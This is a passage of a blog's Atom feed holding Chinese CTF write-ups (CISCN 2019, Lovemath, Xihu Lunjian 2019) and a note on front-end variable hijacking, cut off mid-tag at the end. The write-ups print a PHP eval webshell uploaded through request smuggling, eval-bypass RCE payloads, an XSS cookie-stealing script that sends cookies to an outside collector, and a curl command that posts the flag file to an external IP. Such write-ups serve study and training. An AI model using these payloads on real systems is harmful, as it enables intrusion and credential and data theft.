<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Hpdoger</title>
  
  <subtitle>Valar Morghulis</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://hpdoger.cn/"/>
  <updated>2019-07-30T01:21:54.656Z</updated>
  <id>https://hpdoger.cn/</id>
  
  <author>
    <name>Hpdoger</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CISCN 2019 Final Web11题解</title>
    <link href="https://hpdoger.cn/2019/07/29/CISCN%202019%20Final%20Web11%E5%A4%8D%E7%9B%98/"/>
    <id>https://hpdoger.cn/2019/07/29/CISCN 2019 Final Web11复盘/</id>
    <published>2019-07-28T16:00:00.000Z</published>
    <updated>2019-07-30T01:21:54.656Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CISCN-2019-Final-Web11复盘"><a href="#CISCN-2019-Final-Web11复盘" class="headerlink" title="CISCN 2019 Final Web11复盘"></a>CISCN 2019 Final Web11复盘</h1><p>题目本身结合了很多知识点，比赛没做出来，这里进行复盘分析。</p><p>题目地址：<a href="http://web65.buuoj.cn/" target="_blank" rel="noopener">http://web65.buuoj.cn/</a><br>题目源码：<a href="https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git" target="_blank" rel="noopener">https://github.com/imagemlt/CISCN_2019_final_pmarkdown.git</a></p><h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>题目功能点很清晰：上传md文件、解析md文件为html(通过php拓展)</p><p>在Posts目录存在的.htaccess文件，表明md以php解析，不难想思路就是上传md来getshell</p><pre><code>AddType application/x-httpd-php .md</code></pre><p>但是上传是受到本地限制，也是这道题核心的考点。<br><img src="http://static.zybuluo.com/1160307775/tv820qzlzqhref82quabuss7/image_1dgtncrha8qnb4qjv51vlahbj26.png" alt="image_1dgtncrha8qnb4qjv51vlahbj26.png-120.9kB"></p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>在分析post.php时发现函数pmark_include<br><img src="http://static.zybuluo.com/1160307775/ukd6lm5sgej2r6em6aiiu6co/image_1dgtnif22m4n18851r7irll15r42j.png" alt="image_1dgtnif22m4n18851r7irll15r42j.png-22.1kB"></p><p>它的作用是解析md为html，但在php官方文档并没有找到这个函数，说明是做题人自己编译出来的。在readme.md中同样提示<code>pmarkdown基于pandoc的php解析markdown拓展</code></p><p>当时猜测肯定是这个函数能进行类似于csrf/ssrf的操作，让服务端帮我们上传文件，后续放的提示也证明确实存在一个ssrf的点，只可惜网上基于pandoc的md解析几乎没有php手册。</p><p>不过题目给出了编译后的so文件，那么只能分析opcode(垃圾web狗哭了)。</p><h2 id="解题步骤"><a href="#解题步骤" class="headerlink" title="解题步骤"></a>解题步骤</h2><p>先是逆向so文件。由于是c编译而成，直接拖到ida用f5跟，麻烦pwn师傅教了我一手。下面大致讲一下调用栈，也可能有不对的地方望指正。</p><p>看到sub_1850函数发起了本地请求，并且路径为path<br><img src="http://static.zybuluo.com/1160307775/bz59tutn4arpsk619ono03ml/image_1dgv2l7tc14839tceud1invijj30.png" alt="image_1dgv2l7tc14839tceud1invijj30.png-124.9kB"></p><p>追踪哪里调用了sub_1850并且path的值从何获取，最终追到发起requests时会调用的回调函数<code>zm_activate_pmarkdown</code><br><img src="http://static.zybuluo.com/1160307775/82o977t6qv6vr4liz6jc4h36/image_1dgv3d6mh1e31eao1pk91moij973d.png" alt="image_1dgv3d6mh1e31eao1pk91moij973d.png-28.8kB"></p><p>进行调用的语句如下，不难发现进行了一个对v16参数的判断<br><img src="http://static.zybuluo.com/1160307775/omm1bo25ugdkr1lrz04ioy09/image_1dgv3e7u2gt16cr1et2e8lu553q.png" alt="image_1dgv3e7u2gt16cr1et2e8lu553q.png-38.9kB"></p><p>这里就涉及到知识盲区了，由于不会ida的动态调试，没有确定参数值，这里只能从writeup入手分析条件判断的含义。</p><p>官方payload:</p><pre><code>data=&#39;504f5354202f75706c6f61642e70687020485454502f312e310d0a486f73743a203132372e302e302e313a383038300d0a557365722d4167656e743a204d6f7a696c6c612f352e3020284d6163696e746f73683b20496e74656c204d6163204f5320582031302e31333b2072763a36362e3029204765636b6f2f32303130303130312046697265666f782f36362e300d0a4163636570743a20746578742f68746d6c2c6170706c69636174696f6e2f7868746d6c2b786d6c2c6170706c69636174696f6e2f786d6c3b713d302e392c2a2f2a3b713d302e380d0a4163636570742d4c616e67756167653a207a682c656e2d55533b713d302e372c656e3b713d302e330d0a526566657265723a20687474703a2f2f3132372e302e302e313a383038302f696e6465782e7068703f6163743d75706c6f61640d0a436f6e74656e742d547970653a206d756c7469706172742f666f726d2d646174613b20626f756e646172793d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d4c656e6774683a203234340d0a436f6e6e656374696f6e3a20636c6f73650d0a557067726164652d496e7365637572652d52657175657374733a20310d0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739370d0a436f6e74656e742d446973706f736974696f6e3a20666f726d2d646174613b206e616d653d2266696c65223b2066696c656e616d653d226c6f676f75742e706870220d0a436f6e74656e742d547970653a20746578742f7068700d0a0d0a3c3f706870200d0a6576616c28245f524551554553545b615d293b0a0d0a2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d2d363639333633383838313437393532323633303632333639333739372d2d0d0a&#39;.replace(&#39;\n&#39;,&#39;&#39;)data=data.decode(&#39;hex&#39;)requests.post(url+&#39;/index.php&#39;,data={&#39;debug&#39;:&quot;sadfas HTTP/1.1\r\nHOST:localhost\r\nConnection:Keep-Alive\r\n\r\n%s\r\n&quot;%data},timeout=timeout)</code></pre><p>这样不难理解判断的核心即是否存在debug参数，并且对v16取了24位地址偏移后的值传入下一层函数，也就是之前要最终的形参path。</p><p>在payload中的形式，相当于传递了两个http包，拼接后如下</p><pre><code>POST whatever HTTP/1.1Host: localhostConnection: Keep-AlivePOST /upload.php HTTP/1.1Host: 127.0.0.1:8080User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:66.0) Gecko/20100101 Firefox/66.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh,en-US;q=0.7,en;q=0.3Referer: http://127.0.0.1:8080/index.php?act=uploadContent-Type: multipart/form-data; boundary=---------------------------6693638881479522630623693797Content-Length: 244Connection: closeUpgrade-Insecure-Requests: 1-----------------------------6693638881479522630623693797Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;shell&quot;Content-Type: text/php&lt;?php eval($_REQUEST[a]);-----------------------------6693638881479522630623693797--</code></pre><p>此时就可以把两个http包带入之前的path，构造一个完整的http包请求。而服务端在发送http请求时，会对请求包逐一发送。即先请求了<code>whatever</code>，建立http连接，connection:keep-alive 保持http的连接不被中断。</p><p>第二次请求data.decode(‘hex’)，让server帮我们请求Upload并上传md文件从而getshell</p><h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>传了md就能解析php来getshell，只不过是要饶一个disable_function，预期解使用ld_preload去改变环境变量来bypass。不过有师傅提醒df过滤不全用popen也可以执行命令。</p><p>逆向功底太差了，有机会可以去抓个包分析一下debug参数的请求流程，最后膜出题师傅的知识渊博</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CISCN-2019-Final-Web11复盘&quot;&gt;&lt;a href=&quot;#CISCN-2019-Final-Web11复盘&quot; class=&quot;headerlink&quot; title=&quot;CISCN 2019 Final Web11复盘&quot;&gt;&lt;/a&gt;CISCN 2019 Fin
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>前端全局变量劫持</title>
    <link href="https://hpdoger.cn/2019/07/02/%E5%89%8D%E7%AB%AF%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%8A%AB%E6%8C%81/"/>
    <id>https://hpdoger.cn/2019/07/02/前端全局变量劫持/</id>
    <published>2019-07-01T16:00:00.000Z</published>
    <updated>2019-07-14T12:58:52.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前端全局变量劫持"><a href="#前端全局变量劫持" class="headerlink" title="前端全局变量劫持"></a>前端全局变量劫持</h1><p>最近看了wonderkun师傅的一篇文章，觉得还挺有意思的，收获颇丰。决定自己复现研究一下，原文地址：<a href="http://blog.wonderkun.cc/2019/07/01/前端中存在的变量劫持漏洞" target="_blank" rel="noopener">前端中存在的变量劫持漏洞</a></p><p>先说一下鸡肋的点，这个变量的劫持也只能是把变量劫持为正常页面的window对象，并不能随意修改变量的值</p><h1 id="子页面获取"><a href="#子页面获取" class="headerlink" title="子页面获取"></a>子页面获取</h1><p>首先kun师傅介绍了三种父页面获取子页面windows对象的方式:</p><pre><code>document.getElementById(&quot;iframe1&quot;).contentWindow;window.frames[0]; window[0] ;</code></pre><p>id值是一个全局变量，下例中test这个”id值”就代表iframe标签。也可以通过直接调用iframe内的name属性值获取该iframe的window对象<br><img src="http://static.zybuluo.com/1160307775/8n1kln6kltgkylriy0rutpd9/image_1df3psct91n0slcp85prp177u9.png" alt="image_1df3psct91n0slcp85prp177u9.png-60.3kB"></p><h1 id="利用filter模式删除变量"><a href="#利用filter模式删除变量" class="headerlink" title="利用filter模式删除变量"></a>利用filter模式删除变量</h1><p>无论是javascript还是调用标签，都无法覆盖已经定义的变量，但是却可以定义新的变量。</p><p>怎么让页面中出现未定义的全局变量呢？kun师傅提到chrome74之后，默认的xss auditor 从block模式编程了filter模式，可以利用这个删除掉页面中的代码。也就是说我们用一段xss代码触发chrome xss auditor删除xss引用的变量，从而达到替我们删除正常变量的目的。</p><p>这里简单介绍一下xss auditor</p><h2 id="XSS-Auditor"><a href="#XSS-Auditor" class="headerlink" title="XSS-Auditor"></a>XSS-Auditor</h2><p>XSS-Auditor是chrome默认开启的，也可以选择在header中关闭Auditor</p><pre><code>X-XSS-Protection: 0</code></pre><p>它的检测机制如文档中的描述<br><img src="http://static.zybuluo.com/1160307775/78neclm89yli79mwd4htps6z/image_1df3ue0v61s3a1dcr1spb1dmt12ia1g.png" alt="image_1df3ue0v61s3a1dcr1spb1dmt12ia1g.png-126.6kB"></p><p>XSS Auditor采用黑名单方法来识别请求参数中提供的危险字符和标签。它还将查询参数与内容进行匹配以识别注入点。如果查询参数无法与响应中的内容匹配，则不会触发Auditor。</p><p>不过文档也有提到，基于上下文的检测的局限性使Auditor无法预防一些针对应用层的payload，这里不做深究。</p><h2 id="删除变量demo"><a href="#删除变量demo" class="headerlink" title="删除变量demo"></a>删除变量demo</h2><pre><code>&lt;script&gt;var hpdoger = &quot;remove me&quot;;&lt;/script&gt;</code></pre><p>当访问的参数以危险标签的形式出现在response中时，就会触发xss-auditor，成功删除自定义的hpdoger变量。下图可以看到变量被成功删除</p><pre><code>http://localhost/iframe.html?xss=%3Cscript%3E%0A%20%20%20%20%20var%20hpdoger%20=%20%22remove%22;%0A%3C/script%3E</code></pre><p><img src="http://static.zybuluo.com/1160307775/c70k199x2qygcxi7z7nmf9fg/image_1df3uoatdojsl0fksa1e3b1nb21t.png" alt="image_1df3uoatdojsl0fksa1e3b1nb21t.png-112.7kB"></p><h1 id="bypass同源之iframe"><a href="#bypass同源之iframe" class="headerlink" title="bypass同源之iframe"></a>bypass同源之iframe</h1><p>众所周知，用iframe去加载子页面会被同源限制(除非是cors配置的白名单)<br><img src="http://static.zybuluo.com/1160307775/98cjog73vc1fxs6fuei5nypt/image_1df3vq1ivipk1qo3a383ao1lnd2n.png" alt="image_1df3vq1ivipk1qo3a383ao1lnd2n.png-93.8kB"></p><p><strong>如果儿子页面也存在iframe</strong>(划重点)，先通过操纵孙子c页面window对象来设置location，使其指向父页面a，这样父页面a和子页面b就同源了。之后再修改孙子页面c中window对象的name，其作用结果是：name作用域在子页面b的全局变量。</p><h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>这里不重复造轮子了，引用kun师傅的文章：<a href="https://xz.aliyun.com/t/5565#toc-4" target="_blank" rel="noopener">https://xz.aliyun.com/t/5565#toc-4</a></p><h2 id="孙子页面c"><a href="#孙子页面c" class="headerlink" title="孙子页面c"></a>孙子页面c</h2><p>任意的页面</p><h2 id="子页面b"><a href="#子页面b" class="headerlink" title="子页面b"></a>子页面b</h2><p><img src="http://static.zybuluo.com/1160307775/mz1lfmzmxftl49tvbpeh5lxn/image_1df5h2g811eg76b3bdo1v0b18dqm.png" alt="image_1df5h2g811eg76b3bdo1v0b18dqm.png-53.8kB"></p><h2 id="父页面a"><a href="#父页面a" class="headerlink" title="父页面a"></a>父页面a</h2><p>第一步很关键的一点就是修改c页面的location指向a。之后a页面就可以调用b的变量，同时通过iframe触发b页面的xss auditor<br><img src="http://static.zybuluo.com/1160307775/86zy0vdrthffjgmulc9qqu9c/image_1df5grfcl16f71ejc1j5upqr10re9.png" alt="image_1df5grfcl16f71ejc1j5upqr10re9.png-127.5kB"></p><p>第二步修改孙子页面c的name，从而帮b页面注册一个全局变量名为”hpdoger”<br><img src="http://static.zybuluo.com/1160307775/4qeb5di2v560f26o9jdr9804/image_1df5h8abti9j1bptl671to1e3213.png" alt="image_1df5h8abti9j1bptl671to1e3213.png-72.1kB"></p><p>这样就成功替换掉b页面的hpdoger变量，同时a页面也可以访问b页面这个全局变量hpdoger(但是不能访问b的其他变量。因为我们通过c页面做跳板，只能访问c的属性间接访问到b的变量，我叫他”同名法则”)。不过前文也提到了这个鸡肋的地方，就是一个变量替换成window对象，受用面很有限。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前端全局变量劫持&quot;&gt;&lt;a href=&quot;#前端全局变量劫持&quot; class=&quot;headerlink&quot; title=&quot;前端全局变量劫持&quot;&gt;&lt;/a&gt;前端全局变量劫持&lt;/h1&gt;&lt;p&gt;最近看了wonderkun师傅的一篇文章，觉得还挺有意思的，收获颇丰。决定自己复现研究一下，
      
    
    </summary>
    
    
      <category term="XSS测试" scheme="https://hpdoger.cn/tags/XSS%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>2019国赛Web线上题目Lovemath多解WP</title>
    <link href="https://hpdoger.cn/2019/04/23/2019%E5%9B%BD%E8%B5%9BWeb%E7%BA%BF%E4%B8%8A%E9%A2%98%E7%9B%AELovemath%E5%A4%9A%E8%A7%A3WP/"/>
    <id>https://hpdoger.cn/2019/04/23/2019国赛Web线上题目Lovemath多解WP/</id>
    <published>2019-04-22T16:00:00.000Z</published>
    <updated>2019-07-12T10:03:27.296Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2019国赛Web线上题目Lovemath多解WP"><a href="#2019国赛Web线上题目Lovemath多解WP" class="headerlink" title="2019国赛Web线上题目Lovemath多解WP"></a>2019国赛Web线上题目Lovemath多解WP</h1><p>题目质量很不错，这题整整做了七个小时，从一开始想着拿一血到后来的自闭。</p><h1 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h1><pre><code class="php">&lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET[&#39;c&#39;])){     show_source(__FILE__); }else{     //例子 c=20-1     $content = $_GET[&#39;c&#39;];     if (strlen($content) &gt;= 80) {         die(&quot;太长了不会算&quot;);     }     $blacklist = [&#39; &#39;, &#39;\t&#39;, &#39;\r&#39;, &#39;\n&#39;,&#39;\&#39;&#39;, &#39;&quot;&#39;, &#39;`&#39;, &#39;\[&#39;, &#39;\]&#39;];     foreach ($blacklist as $blackitem) {         if (preg_match(&#39;/&#39; . $blackitem . &#39;/m&#39;, $content)) {             die(&quot;请不要输入奇奇怪怪的字符&quot;);         }     }     //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp     $whitelist = [&#39;abs&#39;, &#39;acos&#39;, &#39;acosh&#39;, &#39;asin&#39;, &#39;asinh&#39;, &#39;atan2&#39;, &#39;atan&#39;, &#39;atanh&#39;, &#39;base_convert&#39;, &#39;bindec&#39;, &#39;ceil&#39;, &#39;cos&#39;, &#39;cosh&#39;, &#39;decbin&#39;, &#39;dechex&#39;, &#39;decoct&#39;, &#39;deg2rad&#39;, &#39;exp&#39;, &#39;expm1&#39;, &#39;floor&#39;, &#39;fmod&#39;, &#39;getrandmax&#39;, &#39;hexdec&#39;, &#39;hypot&#39;, &#39;is_finite&#39;, &#39;is_infinite&#39;, &#39;is_nan&#39;, &#39;lcg_value&#39;, &#39;log10&#39;, &#39;log1p&#39;, &#39;log&#39;, &#39;max&#39;, &#39;min&#39;, &#39;mt_getrandmax&#39;, &#39;mt_rand&#39;, &#39;mt_srand&#39;, &#39;octdec&#39;, &#39;pi&#39;, &#39;pow&#39;, &#39;rad2deg&#39;, &#39;rand&#39;, &#39;round&#39;, &#39;sin&#39;, &#39;sinh&#39;, &#39;sqrt&#39;, &#39;srand&#39;, &#39;tan&#39;, &#39;tanh&#39;];    preg_match_all(&#39;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#39;, $content, $used_funcs);     foreach ($used_funcs[0] as $func) {         if (!in_array($func, $whitelist)) {             die(&quot;请不要输入奇奇怪怪的函数&quot;);         }     }     //帮你算出答案     eval(&#39;echo &#39;.$content.&#39;;&#39;); }</code></pre><h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>代码有一个黑名单blacklist&amp;白名单whitelist。黑名单肯定是绕不过去，虽然正则给了/m模式的情况下可以采用换行绕过，但是\r也在封杀范围所以直接pass。注意看whitelist后面的逻辑：正则匹配所有字母，用foreach逐个比对匹配的字母。<br><img src="http://static.zybuluo.com/1160307775/rd7dioxl1v60noellw9opm0m/image_1d94aluchp6k1a607ht1ml2132q9.png" alt="image_1d94aluchp6k1a607ht1ml2132q9.png-224.4kB"></p><p>也就是说只允许Eval使用白名单的函数做字符串</p><p>所以思路就很明确，既然参数从白名单出来后被执行，那漏洞点肯定就在白名单的函数。由于正则匹配字母的规则，使我们传入的实参不能是字母，否则就会进入判断如下<br><img src="http://static.zybuluo.com/1160307775/73g78cw6hxwdepx0wny3oloy/image_1d9419hr91e511p621k4l177k1a5726.png" alt="image_1d9419hr91e511p621k4l177k1a5726.png-31.6kB"></p><p>想办法把数字变成字母，再通过eval进行RCE。着眼于函数base_convert，官方描述如下<br><img src="http://static.zybuluo.com/1160307775/u1tsyajx6w5bpj9o8bksaa6e/image_1d94aoodi184tdml1udl7q91b0gm.png" alt="image_1d94aoodi184tdml1udl7q91b0gm.png-126.9kB"></p><p>它允许我们将10进制数转换为最高36进制，结果为字符串。完美解决了数字到字母的转化，成功打印phpinfo如下<br><img src="http://static.zybuluo.com/1160307775/6otny6nfb85kfltkdhoutv2b/image_1d94ard4e1orte5mo6a1oj6hjj1j.png" alt="image_1d94ard4e1orte5mo6a1oj6hjj1j.png-396.7kB"></p><h1 id="POC-1"><a href="#POC-1" class="headerlink" title="POC-1"></a>POC-1</h1><p>因为字符串长度限制，我最开始的想法是这样的：</p><pre><code>$input = hexdec(bin2hex(&quot;system(&#39;cat /flag&#39;);&quot;))$result = base_convert(10进制编码字符串hex2bin,10,36)(dechex($input))</code></pre><p>完整转换是这样：</p><pre><code>base_convert(37907361743,10,36)(dechex(9148825951463535960001056079872))</code></pre><p>但是由于bin2hex后转换出来的16进制数值过大，导致hexdec转换的int值很大无法正常被dechex还原而溢出。在赛后看到一种payload，很聪明的避免了大数溢出的情况，如下</p><pre><code>base_convert(47138,20,36)(base_convert(3761671484,13,36)(dechex(474260465194)))</code></pre><p><img src="http://static.zybuluo.com/1160307775/xtgdey8iv615ywg0w55fxfay/image_1d941nbdm171k17a3lhg16ii1knh3q.png" alt="image_1d941nbdm171k17a3lhg16ii1knh3q.png-24.3kB"></p><p>正好79个字母堪称完美…解码后的调用栈如下<br><img src="http://static.zybuluo.com/1160307775/u3la0kpp7bgngowxzez2nx21/image_1d941l8bp14ag1cq1eil1hi57ti3d.png" alt="47138-&gt;exec"></p><h1 id="POC-2"><a href="#POC-2" class="headerlink" title="POC-2"></a>POC-2</h1><p>这个是看到ROIS队伍师傅的poc</p><pre><code>$pi=base_convert;$pi(371235972282,10,28)(($pi(8768397090111664438,10,30))(){9})</code></pre><p>解码出来是<code>system(getallheaders(){9})</code></p><p>也是很聪明的解法。变量赋值pi减少长度，用getallheaders动态传入参数，之前在code puzzle中见过这样的用法</p><h1 id="POC-3"><a href="#POC-3" class="headerlink" title="POC-3"></a>POC-3</h1><p>这种就是比赛时我的解法。一种小数还原的思路。我们只需要构造_GET为16进制数，这个16进制转换出来的十进制就不会很大，自然在dechex也不会溢出。Payload如下，注意用白名单的值作为变量参数，否则还是会被waf</p><pre><code>$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){0}(($$p){1})</code></pre><p>转换的调用栈如下：<br><img src="http://static.zybuluo.com/1160307775/pwdw95ivta0rswwvhukw4mk0/image_1d94271vhpqtbtv1mk1v7upa047.png" alt="image_1d94271vhpqtbtv1mk1v7upa047.png-32.8kB"></p><p>直接发包给到C参数，成功getflag。<br><img src="http://static.zybuluo.com/1160307775/kbdgi0lo22k9ho6p51u4c325/image_1d9427hgv862p0f8bluecra94k.png" alt="image_1d9427hgv862p0f8bluecra94k.png-83.5kB"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;2019国赛Web线上题目Lovemath多解WP&quot;&gt;&lt;a href=&quot;#2019国赛Web线上题目Lovemath多解WP&quot; class=&quot;headerlink&quot; title=&quot;2019国赛Web线上题目Lovemath多解WP&quot;&gt;&lt;/a&gt;2019国赛Web线上
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑2019-Writeup</title>
    <link href="https://hpdoger.cn/2019/04/08/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912019-Writeup/"/>
    <id>https://hpdoger.cn/2019/04/08/西湖论剑2019-Writeup/</id>
    <published>2019-04-07T16:00:00.000Z</published>
    <updated>2019-04-09T08:33:26.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="西湖论剑2019-Writeup"><a href="#西湖论剑2019-Writeup" class="headerlink" title="西湖论剑2019-Writeup"></a>西湖论剑2019-Writeup</h1><p>Author:Hpdoger@D0g3</p><p>这次比赛的Web题顺序放的很有意思。先放web3、再web2、接着web1来了个bug题被秒。ak了三个web之后本来都出去买奶茶喝了，结果比赛末尾有师傅说上了个web4…好在最后零解23333</p><h1 id="Web-3"><a href="#Web-3" class="headerlink" title="Web-3"></a>Web-3</h1><p>扫描到DS_Store文件泄露：<a href="http://ctf3.linkedbyx.com/11182/DS_Store" target="_blank" rel="noopener">http://ctf3.linkedbyx.com/11182/DS_Store</a><br><img src="http://static.zybuluo.com/1160307775/y7a0rdxx52eav7p0rn96oikc/image_1d7rcmc741ep8qtr17um15g5v49.png" alt="image_1d7rcmc741ep8qtr17um15g5v49.png-31.9kB"></p><p>扫描了一下e1xxx这个自路径发现一处git泄露：<br><img src="http://static.zybuluo.com/1160307775/4utptwr6qxtydxzsxhry0pvr/image_1d7rcont5k191lp1131q17k81eri4m.png" alt="image_1d7rcont5k191lp1131q17k81eri4m.png-38.3kB"></p><p>访问到github仓库:<a href="https://github.com/cumtxujiabin/zip" target="_blank" rel="noopener">https://github.com/cumtxujiabin/zip</a><br><img src="http://static.zybuluo.com/1160307775/ucxu7j63r39crwi3tci5vl0x/image_1d7rcp5i018i0sesg9a1oec9g353.png" alt="image_1d7rcp5i018i0sesg9a1oec9g353.png-78.6kB"></p><p>源码git clone下来看，发现Backup这个zip包需要密码，但是同文件夹下有Index.php和jpg被解压出来了。猜测是已知明文攻击<br><img src="http://static.zybuluo.com/1160307775/vhc6g73jwf6obx3j6edutvqy/image_1d7rcsqca1qcl1538t7j1mpti6f60.png" alt="image_1d7rcsqca1qcl1538t7j1mpti6f60.png-37.5kB"></p><p>用AR跑了一下得到hint文件<br><img src="http://static.zybuluo.com/1160307775/kw4offpg4avzpe0ccs5ji599/image_1d7s0v7dd1djv10opn7j11jq113cei.png" alt="image_1d7s0v7dd1djv10opn7j11jq113cei.png-72.4kB"></p><p>点开hint有两个提示，</p><ol><li>很明显这个code就是之前首页的参数值<br><img src="http://static.zybuluo.com/1160307775/qr951e5gxpg4860aulbxpnvj/image_1d7riioviv8dnt21j3g1m6s1l9j6q.png" alt="image_1d7riioviv8dnt21j3g1m6s1l9j6q.png-14.9kB"></li><li>seed应该暗示着随机数/种子</li></ol><p>拿着Code请求得到一个数，结合hint猜测是要用兑换码爆破随机数种子<br><img src="http://static.zybuluo.com/1160307775/lfy0x9hxu4icygym0gkvnrx5/image_1d7rilc951g6t1idm1qtg1osbjnv77.png" alt="image_1d7rilc951g6t1idm1qtg1osbjnv77.png-61.2kB"></p><p>最后跑出来种子+.txt后缀请求得到flag<br><img src="http://static.zybuluo.com/1160307775/a6w2254ge2kgzj3ltc4t7gau/image_1d7rkjigs14vl1gg9h801mr18onag.png" alt="image_1d7rkjigs14vl1gg9h801mr18onag.png-40kB"><br><img src="http://static.zybuluo.com/1160307775/sj0b5o6mrowzi3y4jl0ce6cn/image_1d7rkfg2e1enjh0g1kif2lb14ala3.png" alt="image_1d7rkfg2e1enjh0g1kif2lb14ala3.png-23.2kB"></p><p>略脑洞。。</p><h1 id="Web-2"><a href="#Web-2" class="headerlink" title="Web-2"></a>Web-2</h1><p>题目环境关了有些无法截图</p><p>随便输入账号都能登陆，有留言功能、提交给管理员url的功能和EXEC页面，EXEC我推测是个命令执行但是需要管理员权限，所以应该是XSS-&gt;admin-&gt;rce。留言位置可以插入标签iframe\img\svg.. 但是过滤掉了等号，会被转译成:)，我测试的时候用iframe以base64编码属性就能绕过</p><pre><code>&lt;iframe/src=&quot;data:text/html;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==</code></pre><p>编码内容即<code>&lt;img src=x onerror=alert(1)&gt;</code>，可以弹出对话框，</p><p>看到了提交Url处有这么一句话，大致好像是这么说的：管理员会拿着你的token来请求页面，之前还在想管理员怎么请求到我的main(因为我测试可以缓存js文件，可能也是一个方面)，但是看到这里就完全不用担心了，直接X一个储值型的标签打COOKIE</p><p>但是测试用js uri加载外源js不能成功，打不到cookie。</p><p>那么我们可不可以直接src下调用Javascript伪协议执行一段js发送COOKIE到平台呢？用ascii编码html字符去bypass</p><p>编码转换+exp如下<br><img src="http://static.zybuluo.com/1160307775/b5tqrpd78fjkvlld0e7sxvy9/image_1d7rltv912q91kmukju81714bjbn.png" alt="image_1d7rllved1r0b1ku31lp717bi3hdat.png-71.2kB"></p><p>url编码处理一下&amp;、#字符<br><img src="http://static.zybuluo.com/1160307775/amfts3uhddl0jr31udpj9qpa/image_1d7rloelagnr1aib1g56184q16cpba.png" alt="image_1d7rloelagnr1aib1g56184q16cpba.png-153kB"></p><p>在平台打到cookie，发现存在admin字段<br><img src="http://static.zybuluo.com/1160307775/e3jfk48x3gtv1b2sv72x2rkh/image_1d7rlvepfab61co61oj45l6nctc4.png" alt="image_1d7rlvepfab61co61oj45l6nctc4.png-36.5kB"></p><p>带着admin字段去exec.php执行命令就行了<br><img src="http://static.zybuluo.com/1160307775/ucowwhqx8njayw5q0mdhm8rm/image_1d7rm2jhs1ijc1t2898epplgch.png" alt="image_1d7rm2jhs1ijc1t2898epplgch.png-70.5kB"></p><pre><code>curl+&#39;http://50.16.48.95/&#39;+--data+&quot;`cat+/flag.txt`&quot;</code></pre><p><img src="http://static.zybuluo.com/1160307775/lpus3euv91f6ktmyow8un530/image_1d7rm3mr9ffe1d2gqr93lp1obcu.png" alt="image_1d7rm3mr9ffe1d2gqr93lp1obcu.png-57kB"></p><p>编码转换的exp如下</p><pre><code># Author:Hpdoger@d0g3html_old = &quot;javascript:var website=&#39;http://xssye/index.php&#39;;(function(){(new Image()).src=website+&#39;/?keepsession=1&amp;location=&#39;+escape((function(){try{return document.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;toplocation=&#39;+escape((function(){try{return top.location.href}catch(e){return&#39;&#39;}})())+&#39;&amp;cookie=&#39;+escape((function(){try{return document.cookie}catch(e){return&#39;&#39;}})())+&#39;&amp;opener=&#39;+escape((function(){try{return(window.opener&amp;&amp;window.opener.location.href)?window.opener.location.href:&#39;&#39;}catch(e){return&#39;&#39;}})());})();&quot;buffer = &quot;&quot;for zimu in html_old:    zimu = ord(zimu)    zimu = &quot;&amp;#&quot;+(&quot;%07d&quot;) % (zimu)    # print(&quot;&amp;#&quot;+zimu)    buffer = buffer + zimuprint(buffer)</code></pre><h1 id="web-1"><a href="#web-1" class="headerlink" title="web-1"></a>web-1</h1><p>这题上来就有个提示$_GET[‘file’]，打了下etc/passwd有内容</p><p>看到有个提示，base64解码之后是，dir.php<br><img src="http://static.zybuluo.com/1160307775/sn4yzp6jhu22951ixfda9wz9/image_1d7rmb67sieflmcrj41nmodcsdb.png" alt="image_1d7rmb67sieflmcrj41nmodcsdb.png-66.1kB"></p><p>请求dir.php，同时fuzz参数，有个dir(其实略脑洞，我只尝试了file、dir、path就出来了。。<br><img src="http://static.zybuluo.com/1160307775/dqvga0mdv6ohks1ymtth4rbe/image_1d7rmfl1j1rab1ind11sb1ffr1bshdo.png" 